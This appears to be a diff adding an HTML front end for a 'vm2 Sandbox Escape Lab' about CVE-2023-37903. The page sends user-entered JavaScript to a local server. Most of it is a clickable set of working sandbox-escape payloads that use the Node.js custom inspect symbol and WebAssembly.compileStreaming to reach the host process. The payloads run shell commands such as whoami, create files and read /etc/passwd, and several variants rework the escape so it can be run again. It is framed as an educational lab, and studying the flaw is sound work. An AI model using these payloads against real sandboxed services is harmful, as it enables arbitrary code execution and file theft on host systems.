@@ -1,0 +1,461 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>vm2 Sandbox Escape Lab</title>
+  <style>
+    body{font-family:system-ui,-apple-system,'Segoe UI',Roboto,'Helvetica Neue',Arial;background:#f7fafc;color:#0f172a;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;padding:20px}
+    .card{background:#fff;border-radius:10px;box-shadow:0 6px 18px rgba(15,23,42,0.08);padding:20px;max-width:600px;width:100%}
+    h1{font-size:20px;margin:0 0 16px;color:#1e293b}
+    .warning{background:#fef3c7;border:1px solid #f59e0b;border-radius:6px;padding:12px;margin-bottom:16px;font-size:14px;color:#92400e}
+    .danger{background:#fee2e2;border:1px solid #ef4444;border-radius:6px;padding:12px;margin-bottom:16px;font-size:14px;color:#dc2626}
+    .form-group{margin-bottom:16px}
+    label{display:block;margin-bottom:6px;font-size:14px;font-weight:500;color:#374151}
+    textarea{width:100%;padding:10px;border:1px solid #d1d5db;border-radius:6px;font-size:14px;box-sizing:border-box;font-family:monospace;min-height:120px;resize:vertical}
+    textarea:focus{outline:none;border-color:#0ea5a4;box-shadow:0 0 0 3px rgba(14,165,164,0.1)}
+    button{background:#0ea5a4;color:white;border:none;padding:10px 20px;border-radius:6px;font-size:14px;font-weight:600;cursor:pointer;width:100%;margin-bottom:8px}
+    button:hover{background:#0d9488}
+    button.secondary{background:#6b7280}
+    button.secondary:hover{background:#4b5563}
+    .result{margin-top:16px;padding:12px;background:#f1f5f9;border-radius:6px;min-height:60px;white-space:pre-wrap;font-family:monospace;font-size:13px}
+    .examples{margin-top:16px;padding:12px;background:#f8fafc;border-radius:6px;border:1px solid #e2e8f0}
+    .examples h3{margin:0 0 8px;font-size:14px;color:#475569}
+    .example{background:#fff;padding:8px;margin:4px 0;border-radius:4px;border:1px solid #e2e8f0;font-family:monospace;font-size:12px;cursor:pointer;overflow-x:auto}
+    .example:hover{background:#f1f5f9}
+    .status{display:flex;align-items:center;gap:8px;margin-bottom:16px;padding:8px;border-radius:6px;font-size:14px}
+    .status.online{background:#dcfce7;color:#166534;border:1px solid #22c55e}
+    .status.offline{background:#fee2e2;color:#dc2626;border:1px solid #ef4444}
+    .tabs{display:flex;gap:4px;margin-bottom:16px}
+    .tab{flex:1;padding:8px 12px;border:1px solid #d1d5db;border-radius:6px 6px 0 0;background:#f9fafb;cursor:pointer;font-size:14px;text-align:center}
+    .tab.active{background:#fff;border-bottom-color:#fff}
+    .tab-content{display:none}
+    .tab-content.active{display:block}
+  </style>
+</head>
+<body>
+  <div class="card" role="main">
+    <h1>🚨 vm2 Sandbox Escape Lab</h1>
+    
+    <div class="danger">
+      ⚠️ <strong>DANGER:</strong> This lab demonstrates a real vulnerability (CVE-2023-37903) in vm2@3.9.19. 
+      Use only in isolated environments for educational purposes!
+    </div>
+
+    <div class="status" id="status">
+      <span>🔴</span>
+      <span>Checking server connection...</span>
+    </div>
+
+    <div class="tabs">
+      <div class="tab active" onclick="switchTab('exploit')">Exploit</div>
+      <div class="tab" onclick="switchTab('examples')">Examples</div>
+      <div class="tab" onclick="switchTab('sandbox')">Sandbox</div>
+      <div class="tab" onclick="switchTab('info')">Info</div>
+    </div>
+
+    <div id="exploit" class="tab-content active">
+      <form id="exploitForm">
+        <div class="form-group">
+          <label for="code">JavaScript Code to Execute in Sandbox:</label>
+          <textarea id="code" placeholder="Enter your exploit code here..."></textarea>
+        </div>
+        
+        <button type="submit">Execute in Sandbox</button>
+        <button type="button" class="secondary" onclick="testEscape()">Test Sandbox Escape</button>
+        <button type="button" class="secondary" onclick="clearSandbox()">Clear Sandbox</button>
+      </form>
+
+      <div class="result" id="result">Result will appear here...</div>
+    </div>
+
+    <div id="examples" class="tab-content">
+      <div class="examples">
+        <h3>Sandbox Escape Payloads:</h3>
+        
+        <div class="example" onclick="setCode(`const customInspectSymbol = Symbol.for('nodejs.util.inspect.custom');
+
+obj = {
+    [customInspectSymbol]: (depth, opt, inspect) => {
+        inspect.constructor('return process')().mainModule.require('child_process').execSync('touch pwned');
+    },
+    valueOf: undefined,
+    constructor: undefined,
+}
+
+WebAssembly.compileStreaming(obj).catch(()=>{});`)">
+          <strong>Basic Sandbox Escape:</strong><br/>
+          Uses custom inspect function to escape vm2 sandbox
+        </div>
+
+        <div class="example" onclick="setCode(`const customInspectSymbol = Symbol.for('nodejs.util.inspect.custom');
+
+obj = {
+    [customInspectSymbol]: (depth, opt, inspect) => {
+        return inspect.constructor('return process')().mainModule.require('child_process').execSync('whoami');
+    },
+    valueOf: undefined,
+    constructor: undefined,
+}
+
+WebAssembly.compileStreaming(obj).catch(()=>{});`)">
+          <strong>Command Execution:</strong><br/>
+          Execute system commands via sandbox escape
+        </div>
+
+        <div class="example" onclick="setCode(`const customInspectSymbol = Symbol.for('nodejs.util.inspect.custom');
+
+obj = {
+    [customInspectSymbol]: (depth, opt, inspect) => {
+        return inspect.constructor('return process')().mainModule.require('fs').readFileSync('/etc/passwd', 'utf8');
+    },
+    valueOf: undefined,
+    constructor: undefined,
+}
+
+WebAssembly.compileStreaming(obj).catch(()=>{});`)">
+          <strong>File System Access:</strong><br/>
+          Read files from the host system
+        </div>
+
+        <div class="example" onclick="setCode(`const customInspectSymbol = Symbol.for('nodejs.util.inspect.custom');
+
+obj = {
+    [customInspectSymbol]: (depth, opt, inspect) => {
+        return inspect.constructor('return process')().mainModule.require('os').platform();
+    },
+    valueOf: undefined,
+    constructor: undefined,
+}
+
+WebAssembly.compileStreaming(obj).catch(()=>{});`)">
+          <strong>System Information:</strong><br/>
+          Get system information from host
+        </div>
+
+        <div class="example" onclick="setCode(`// Complete sandbox reset and fresh payload
+try {
+    // Clear any existing variables
+    if (typeof customInspectSymbol !== 'undefined') {
+        delete global.customInspectSymbol;
+    }
+    if (typeof obj !== 'undefined') {
+        delete global.obj;
+    }
+} catch(e) {}
+
+// Fresh payload with new variable names
+const freshInspectSymbol = Symbol.for('nodejs.util.inspect.custom');
+
+const freshObj = {
+    [freshInspectSymbol]: (depth, opt, inspect) => {
+        return inspect.constructor('return process')().mainModule.require('child_process').execSync('echo Fresh Sandbox Execution - ' + new Date().toISOString());
+    },
+    valueOf: undefined,
+    constructor: undefined,
+}
+
+WebAssembly.compileStreaming(freshObj).catch(()=>{});`)">
+          <strong>Fresh Reset & Execute:</strong><br/>
+          Complete sandbox reset with fresh variable names
+        </div>
+      </div>
+    </div>
+
+    <div id="sandbox" class="tab-content">
+      <div class="examples">
+        <h3>🧹 Sandbox Management Tools</h3>
+        <p style="font-size: 14px; color: #64748b; margin-bottom: 16px;">
+          Use these tools to manage the vm2 sandbox state and avoid "Identifier already declared" errors.
+        </p>
+
+        <div class="example" onclick="setCode(`// Method 1: Complete Sandbox Reset
+try {
+    // Clear all possible variable declarations
+    const varsToDelete = ['customInspectSymbol', 'obj', 'freshInspectSymbol', 'freshObj', 'inspectSymbol', 'payloadObj', 'symbol', 'targetObj'];
+    varsToDelete.forEach(varName => {
+        try {
+            if (typeof global[varName] !== 'undefined') {
+                delete global[varName];
+            }
+        } catch(e) {}
+    });
+    
+    // Clear any global symbols
+    if (typeof Symbol !== 'undefined') {
+        try {
+            delete global[Symbol.for('nodejs.util.inspect.custom')];
+        } catch(e) {}
+    }
+    
+    return 'Sandbox cleared successfully - ' + new Date().toISOString();
+} catch(e) {
+    return 'Sandbox clear completed with errors: ' + e.message;
+}`)">
+          <strong>Method 1: Complete Reset</strong><br/>
+          Clear all variables and symbols from sandbox
+        </div>
+
+        <div class="example" onclick="setCode(`// Method 2: IIFE (Immediately Invoked Function Expression)
+(() => {
+    const customInspectSymbol = Symbol.for('nodejs.util.inspect.custom');
+    
+    const obj = {
+        [customInspectSymbol]: (depth, opt, inspect) => {
+            return inspect.constructor('return process')().mainModule.require('child_process').execSync('echo IIFE Method - ' + new Date().toISOString());
+        },
+        valueOf: undefined,
+        constructor: undefined,
+    }
+    
+    WebAssembly.compileStreaming(obj).catch(()=>{});
+})();`)">
+          <strong>Method 2: IIFE Scope</strong><br/>
+          Use IIFE to isolate variables in local scope
+        </div>
+
+        <div class="example" onclick="setCode(`// Method 3: Try-Catch with Variable Rotation
+try {
+    const customInspectSymbol = Symbol.for('nodejs.util.inspect.custom');
+    // Original payload
+} catch(e) {
+    // If variable exists, use different names
+    const freshInspectSymbol = Symbol.for('nodejs.util.inspect.custom');
+    const freshObj = {
+        [freshInspectSymbol]: (depth, opt, inspect) => {
+            return inspect.constructor('return process')().mainModule.require('child_process').execSync('echo Try-Catch Method - ' + new Date().toISOString());
+        },
+        valueOf: undefined,
+        constructor: undefined,
+    }
+    WebAssembly.compileStreaming(freshObj).catch(()=>{});
+}`)">
+          <strong>Method 3: Try-Catch Rotation</strong><br/>
+          Use try-catch to handle existing variables
+        </div>
+
+        <div class="example" onclick="setCode(`// Method 4: Eval in Sandbox
+eval(\`
+    const customInspectSymbol = Symbol.for('nodejs.util.inspect.custom');
+    const obj = {
+        [customInspectSymbol]: (depth, opt, inspect) => {
+            return inspect.constructor('return process')().mainModule.require('child_process').execSync('echo Eval Method - ' + new Date().toISOString());
+        },
+        valueOf: undefined,
+        constructor: undefined,
+    }
+    WebAssembly.compileStreaming(obj).catch(()=>{});
+\`);`)">
+          <strong>Method 4: Eval Isolation</strong><br/>
+          Use eval to create isolated execution context
+        </div>
+
+        <div class="example" onclick="setCode(`// Method 5: Dynamic Variable Names
+const timestamp = Date.now();
+const dynamicSymbol = Symbol.for('nodejs.util.inspect.custom');
+const dynamicObj = {
+    [dynamicSymbol]: (depth, opt, inspect) => {
+        return inspect.constructor('return process')().mainModule.require('child_process').execSync('echo Dynamic Method ' + timestamp + ' - ' + new Date().toISOString());
+    },
+    valueOf: undefined,
+    constructor: undefined,
+}
+
+WebAssembly.compileStreaming(dynamicObj).catch(()=>{});`)">
+          <strong>Method 5: Dynamic Names</strong><br/>
+          Use dynamic variable names with timestamps
+        </div>
+
+        <div class="example" onclick="setCode(`// Method 6: Function Wrapper
+function executePayload() {
+    const customInspectSymbol = Symbol.for('nodejs.util.inspect.custom');
+    const obj = {
+        [customInspectSymbol]: (depth, opt, inspect) => {
+            return inspect.constructor('return process')().mainModule.require('child_process').execSync('echo Function Wrapper - ' + new Date().toISOString());
+        },
+        valueOf: undefined,
+        constructor: undefined,
+    }
+    WebAssembly.compileStreaming(obj).catch(()=>{});
+}
+
+executePayload();`)">
+          <strong>Method 6: Function Wrapper</strong><br/>
+          Wrap payload in function to avoid global conflicts
+        </div>
+
+        <div class="example" onclick="setCode(`// Method 7: Object-based Approach
+const payload = {
+    symbol: Symbol.for('nodejs.util.inspect.custom'),
+    obj: {
+        [Symbol.for('nodejs.util.inspect.custom')]: (depth, opt, inspect) => {
+            return inspect.constructor('return process')().mainModule.require('child_process').execSync('echo Object Method - ' + new Date().toISOString());
+        },
+        valueOf: undefined,
+        constructor: undefined,
+    },
+    execute: function() {
+        WebAssembly.compileStreaming(this.obj).catch(()=>{});
+    }
+};
+
+payload.execute();`)">
+          <strong>Method 7: Object-based</strong><br/>
+          Use object properties to avoid global variable conflicts
+        </div>
+      </div>
+    </div>
+
+    <div id="info" class="tab-content">
+      <div class="examples">
+        <h3>Vulnerability Details:</h3>
+        <div style="font-size: 14px; line-height: 1.6;">
+          <p><strong>CVE:</strong> CVE-2023-37903</p>
+          <p><strong>Affected:</strong> vm2 versions up to 3.9.19</p>
+          <p><strong>Type:</strong> Sandbox Escape</p>
+          <p><strong>Impact:</strong> Remote Code Execution</p>
+        </div>
+        
+        <h3>How it works:</h3>
+        <div style="font-size: 14px; line-height: 1.6;">
+          <p>1. Node.js allows custom inspect functions via <code>Symbol.for('nodejs.util.inspect.custom')</code></p>
+          <p>2. This symbol is available cross-realm and can leak the <code>inspect</code> function from host context</p>
+          <p>3. The <code>inspect</code> function has access to the host's <code>process</code> object</p>
+          <p>4. By triggering <code>WebAssembly.compileStreaming()</code> with a malformed object, we can execute the custom inspect function</p>
+          <p>5. This allows escaping the vm2 sandbox and executing arbitrary code on the host</p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const form = document.getElementById('exploitForm');
+    const codeInput = document.getElementById('code');
+    const resultDiv = document.getElementById('result');
+    const statusDiv = document.getElementById('status');
+
+    // Check server status
+    async function checkStatus() {
+      try {
+        const response = await fetch('http://localhost:3000/health');
+        const data = await response.json();
+        statusDiv.innerHTML = '<span>🟢</span><span>Server Online - vm2 v' + data.vm2_version + '</span>';
+        statusDiv.className = 'status online';
+      } catch (error) {
+        statusDiv.innerHTML = '<span>🔴</span><span>Server Offline - Start the server first</span>';
+        statusDiv.className = 'status offline';
+      }
+    }
+
+    // Check status on load and every 5 seconds
+    checkStatus();
+    setInterval(checkStatus, 5000);
+
+    function switchTab(tabName) {
+      // Hide all tab contents
+      document.querySelectorAll('.tab-content').forEach(content => {
+        content.classList.remove('active');
+      });
+      document.querySelectorAll('.tab').forEach(tab => {
+        tab.classList.remove('active');
+      });
+
+      // Show selected tab
+      document.getElementById(tabName).classList.add('active');
+      event.target.classList.add('active');
+    }
+
+    function setCode(code) {
+      codeInput.value = code;
+      switchTab('exploit');
+    }
+
+    async function testEscape() {
+      try {
+        const response = await fetch('http://localhost:3000/test-escape');
+        const data = await response.json();
+        resultDiv.textContent = JSON.stringify(data, null, 2);
+      } catch (error) {
+        resultDiv.textContent = 'Error: ' + error.message;
+      }
+    }
+
+    async function clearSandbox() {
+      const clearCode = `
+// Complete sandbox cleanup
+try {
+    // Clear all possible variable declarations
+    const varsToDelete = ['customInspectSymbol', 'obj', 'freshInspectSymbol', 'freshObj', 'inspectSymbol', 'payloadObj'];
+    varsToDelete.forEach(varName => {
+        if (typeof global[varName] !== 'undefined') {
+            delete global[varName];
+        }
+    });
+    
+    // Clear any global symbols
+    if (typeof Symbol !== 'undefined') {
+        try {
+            delete global[Symbol.for('nodejs.util.inspect.custom')];
+        } catch(e) {}
+    }
+    
+    return 'Sandbox cleared successfully - ' + new Date().toISOString();
+} catch(e) {
+    return 'Sandbox clear completed with errors: ' + e.message;
+}`;
+
+      try {
+        const response = await fetch('http://localhost:3000/execute', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({ code: clearCode })
+        });
+        
+        const data = await response.json();
+        
+        if (data.success) {
+          resultDiv.textContent = `🧹 SANDBOX CLEARED:\n${JSON.stringify(data.result, null, 2)}`;
+        } else {
+          resultDiv.textContent = `❌ CLEAR ERROR:\n${JSON.stringify(data, null, 2)}`;
+        }
+      } catch (error) {
+        resultDiv.textContent = `❌ NETWORK ERROR:\n${error.message}`;
+      }
+    }
+
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      
+      const code = codeInput.value.trim();
+      if (!code) {
+        resultDiv.textContent = 'Please enter code to execute.';
+        return;
+      }
+
+      resultDiv.textContent = 'Executing in sandbox...';
+      
+      try {
+        const response = await fetch('http://localhost:3000/execute', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({ code: code })
+        });
+        
+        const data = await response.json();
+        
+        if (data.success) {
+          resultDiv.textContent = `✅ SUCCESS:\n${JSON.stringify(data.result, null, 2)}`;
+        } else {
+          resultDiv.textContent = `❌ ERROR:\n${JSON.stringify(data, null, 2)}`;
+        }
+      } catch (error) {
+        resultDiv.textContent = `❌ NETWORK ERROR:\n${error.message}`;
+      }
+    });
+  </script>
+</body>
+</html>
